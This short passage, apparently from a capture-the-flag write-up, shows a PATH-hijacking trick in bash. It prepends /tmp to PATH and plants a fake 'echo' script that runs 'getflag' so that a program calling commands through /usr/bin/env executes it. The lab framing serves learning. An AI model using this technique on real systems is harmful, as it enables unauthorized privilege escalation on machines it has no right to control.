Since it uses /usr/bin/env, you might manipulate the environment:

bash
# Set PATH to point to your malicious echo
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/echo
echo 'getflag' >> /tmp/echo
chmod +x /tmp/echo
